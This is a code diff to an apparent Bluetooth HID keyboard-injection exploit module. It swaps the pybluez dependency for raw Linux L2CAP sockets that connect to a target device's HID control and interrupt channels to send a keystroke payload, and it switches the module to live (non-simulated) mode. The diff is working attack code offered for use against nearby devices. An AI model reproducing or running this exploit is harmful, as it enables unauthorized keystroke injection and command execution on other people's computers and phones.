@@ -257,19 +257,18 @@ class BTHIDKeyboardInject:
         if not self._setup_hci():
             return {"error": "HCI adapter setup failed"}
 
-        # Attempt L2CAP connection on HID control (17) and interrupt (19) channels
+        # L2CAP connection via native Python socket (no pybluez needed)
+        import socket as _socket
+        AF_BLUETOOTH = 31  # Linux AF_BLUETOOTH
+        BTPROTO_L2CAP = 0
         try:
-            import bluetooth
-        except ImportError:
-            return {"error": "pybluez not installed. Run: pip install pybluez"}
-
-        try:
-            ctrl_sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+            ctrl_sock = _socket.socket(AF_BLUETOOTH, _socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
             ctrl_sock.connect((self.target_addr, 17))
-            intr_sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+            intr_sock = _socket.socket(AF_BLUETOOTH, _socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
             intr_sock.connect((self.target_addr, 19))
-        except bluetooth.btcommon.BluetoothError as exc:
-            return {"error": f"Bluetooth connection failed: {exc}"}
+        except OSError as exc:
+            return {"error": f"Bluetooth L2CAP connection failed: {exc}. "
+                    "Ensure device is discoverable and in HID pairing mode."}
 
         sent = 0
         try:
@@ -344,8 +343,8 @@ class Exploit(_BaseExploit):
         injector = BTHIDKeyboardInject(
             target_addr=addr,
             payload=str(self.payload),
-            spoof_addr=str(self.spoof_addr) or None,
-            hci_iface=str(self.hci_iface),
+            hci_index=int(str(self.hci_iface).replace("hci","") or "0"),
+            simulate=False,
         )
         result = injector.run()
         if result.get("success"):
